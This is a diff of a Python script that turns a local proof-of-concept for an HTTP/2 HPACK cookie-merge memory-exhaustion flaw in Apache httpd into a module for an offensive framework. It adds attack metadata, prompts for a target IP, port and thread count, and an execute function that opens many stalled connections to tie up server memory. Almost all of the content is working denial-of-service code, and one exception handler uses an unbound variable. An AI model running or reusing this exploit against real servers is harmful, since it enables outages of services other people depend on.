@@ -1,10 +1,61 @@
-#!/usr/bin/env python3
-import argparse
 import socket
 import struct
 import threading
 import time
+import smf
+
+from apps.utility.colors import *
+from argparse import Namespace
 from typing import Iterable, List, Tuple
+
+metadata = {
+    # 1. Unique Identification & Attribution Module
+    "Name": "Http/2 Bomb",
+    "Description": """
+CVE-2026-49975 is a Denial of Service (DoS) vulnerability in Apache HTTP Server.
+The vulnerability occurs in the HTTP/2 request handling path,
+where multiple cookie header fields can be merged without being
+properly counted against LimitRequestFields. By sending a small
+HPACK-encoded HTTP/2 request that expands into many cookie header fields,
+an attacker can force the server to repeatedly allocate memory during Cookie
+header merging. The attacker can then use HTTP/2 flow control to delay
+response transmission, keeping the affected streams open and preventing
+the allocated memory from being released.
+    """,
+    "Author": ["zxelzy"],
+    "License": "SMF LICENSE",
+    "Date": "2026-06-19",
+    "Action": [
+        ["HTTP/2 Upgrade", {"Description": "Opening a TCP connection (raw socket)"}],
+        ["HPACK Table", {"Description": "Create a HEADERS frame for the HPACK compression payload"}],
+        ["Indexed References", {"Description": "Sending index reference (Indexed Header Field representation)"}],
+        ["Window Stall", {"Description": "Sends a control frame to lock the server RAM."}],
+        ["Anti-Timeout", {"Description": "Keep TCP connections from dropping"}],
+    ],
+    "DefaultAction": "DoS",
+    # 2. Vulnerability Intelligence
+    "Vulnerability": {
+        "CVE": "CVE-2026-49975",
+        "Severity": "CRITICAL",
+        "Published": "2026-06-08",
+        "Updated": "2026-06-18",
+        "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-49975",
+            "https://www.cve.org/CVERecord?id=CVE-2026-49975",
+            "https://access.redhat.com/security/cve/cve-2026-49975",
+            "https://github.com/EQSTLab/CVE-2026-49975"
+        ],
+    }
+}
+
+# OPTIONS MODULES
+REQUIRED_OPTIONS = {
+    "IP": "Enter the target IP (example: 127.0.0.1)",
+    "PORT": "Enter PORT (example: 10080)",
+    "PATH": "File path (example: /big.bin)",
+    "THREAD": "Thread for loop (example: 100)",
+    "SERVER": "Server name (example: localhost)",
+}
 
 # HTTP/2 통신 시작을 알림
 CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
@@ -255,11 +306,11 @@ def drip_window(sock: socket.socket, stream_ids: List[int], amount: int) -> None
 
 
 # HTTP/2 통신
-def run_connection(conn_id: int, args: argparse.Namespace, block: bytes) -> None:
+def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
     try:
         sock = connect_h2c(args.host, args.port, args.initial_window)
     except OSError as e:
-        print(f"conn={conn_id} connect_failed={e}", flush=True)
+        smf.printf(f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}connect_failed={CC.RESET}{e}", flush=True)
         return
 
     stream_ids = [1 + 2 * i for i in range(args.streams)]
@@ -272,18 +323,18 @@ def run_connection(conn_id: int, args: argparse.Namespace, block: bytes) -> None
             frames += send_header_block(sock, stream_id, block)
 
     except OSError as e:
-        print(f"conn={conn_id} send_failed={e}", flush=True)
+        print(f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}send_failed={CC.RESET}{e}", flush=True)
         try:
             sock.close()
-        except OSError:
-            pass
+        except OSError as e:
+            smf.printd(f"Conn={conn_id} Sending Failed", e, level="ERROR")
         return
 
     elapsed = time.monotonic() - started
 
-    print(
-        f"conn={conn_id} sent_streams={len(stream_ids)} "
-        f"header_block={len(block)}B frames={frames} elapsed={elapsed:.3f}s",
+    smf.printf(
+        f"{CC.YELLOW}conn={CC.RESET}{conn_id} {CC.YELLOW}sent_streams={CC.RESET}{len(stream_ids)} "
+        f"{CC.YELLOW}header_block={CC.RESET}{len(block)}B {CC.YELLOW}frames={CC.RESET}{frames} {CC.YELLOW}elapsed={CC.RESET}{elapsed:.3f}s",
         flush=True,
     )
 
@@ -313,64 +364,79 @@ def run_connection(conn_id: int, args: argparse.Namespace, block: bytes) -> None
         if args.drip_interval > 0 and time.monotonic() < stop_at:
             try:
                 drip_window(sock, stream_ids, args.drip_bytes)
-            except OSError:
+            except OSError as e:
+                smf.printd("CONNECTION FAILED", e, level="ERROR")
                 break
         else:
             break
 
-    print(f"conn={conn_id} peer_frames={counts}", flush=True)
+    smf.printf(f"{CC.YELLOW}conn={CC.RESET}{conn_id} {CC.YELLOW}peer_frames={CC.RESET}{counts}", flush=True)
 
     try:
         sock.close()
     except OSError:
+        smf.printd("CONNECTION FAILED", e, level="ERROR")
         pass
 
 
-def main() -> None:
-    parser = argparse.ArgumentParser(
-        description="Local h2c PoC for Apache httpd mod_http2 HPACK Cookie memory amplification"
+def execute(options):
+    host = options.get("IP")
+    port = options.get("PORT")
+    server = options.get("SERVER")
+    path = options.get("PATH")
+    loop = int(options.get("THREAD"))
+
+    DEFAULT_STREAMS = 30
+    MAX_REFS = 4091
+    DEFAULT_HOLD = 300.0
+    DEFAULT_DRIP_INTERVAL = 2.0
+    DEFAULT_DRIP_BYTES = 1
+    INITIAL_WINDOW = 0
+
+    streams = DEFAULT_STREAMS
+    refs = MAX_REFS
+    hold = DEFAULT_HOLD
+    drip_interval = DEFAULT_DRIP_INTERVAL
+    drip_bytes = DEFAULT_DRIP_BYTES
+    window = INITIAL_WINDOW
+    
+    conn = Namespace(
+        host=host,
+        port=port,
+        server_name=server,
+        path=path,
+        connections=loop,
+        streams=streams,
+        refs=refs,
+        initial_window=window,
+        hold=hold,
+        drip_interval=drip_interval,
+        drip_bytes=drip_bytes,
     )
 
-    parser.add_argument("--host", default="127.0.0.1")
-    parser.add_argument("--port", type=int, default=10080)
-    parser.add_argument("--server-name", default="localhost")
-    parser.add_argument("--path", default="/big.bin")
+    block = build_httpd_cookie_bomb(server, path, refs)
 
-    parser.add_argument("--connections", type=int, default=1)
-    parser.add_argument("--streams", type=int, default=30)
-    parser.add_argument("--refs", type=int, default=4091)
-
-    parser.add_argument("--initial-window", type=int, default=0)
-    parser.add_argument("--hold", type=float, default=300.0)
-
-    parser.add_argument("--drip-interval", type=float, default=2.0)
-    parser.add_argument("--drip-bytes", type=int, default=1)
-
-    args = parser.parse_args()
-
-    block = build_httpd_cookie_bomb(args.server_name, args.path, args.refs)
-
-    accepted_duplicate_refs = min(args.refs, 4091)
+    accepted_duplicate_refs = min(refs, 4091)
     merge_alloc = (
         accepted_duplicate_refs * (accepted_duplicate_refs + 1)
         + accepted_duplicate_refs
     )
     final_cookie = accepted_duplicate_refs * 2
 
-    print(
-        "payload: "
-        f"refs={args.refs} "
-        f"path={args.path} "
-        f"header_block={len(block)}B "
-        f"estimated_merge_alloc={merge_alloc / 1048576:.2f}MiB "
-        f"final_cookie={final_cookie}B "
-        f"per_stream_wire_to_cookie_alloc={merge_alloc / max(1, len(block)):.1f}:1",
+    smf.printf(
+        f"{CC.CYAN}payload:{CC.RESET} "
+        f"{CC.GREEN}refs={CC.RESET}{refs} "
+        f"{CC.GREEN}path={CC.RESET}{path} "
+        f"{CC.GREEN}header_block={CC.RESET}{len(block)}B "
+        f"{CC.GREEN}estimated_merge_alloc={CC.RESET}{merge_alloc / 1048576:.2f}MiB "
+        f"{CC.GREEN}final_cookie={CC.RESET}{final_cookie}B "
+        f"{CC.GREEN}per_stream_wire_to_cookie_alloc={CC.RESET}{merge_alloc / max(1, len(block)):.1f}:1",
         flush=True,
     )
 
     threads = [
-        threading.Thread(target=run_connection, args=(i, args, block), daemon=False)
-        for i in range(args.connections)
+        threading.Thread(target=run_connection, args=(i, conn, block), daemon=False)
+        for i in range(loop)
     ]
 
     for thread in threads:
